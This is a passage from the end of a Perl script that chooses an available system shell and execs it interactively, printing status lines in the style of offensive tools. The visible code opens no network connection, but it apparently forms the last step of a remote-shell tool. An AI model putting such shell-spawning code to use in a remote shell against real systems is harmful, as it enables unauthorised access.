    my @shells = ("/bin/bash", "/bin/sh", "/bin/csh");
    my $shell = "/bin/sh";  # default fallback

    foreach my $test_shell (@shells) {
        if (-x $test_shell) {
            $shell = $test_shell;
            last;
        }
    }

    print "[*] Using shell: $shell\n";

    # Execute shell - this replaces current process
    exec($shell, "-i") or die "[!] Cannot execute $shell: $!\n";
}

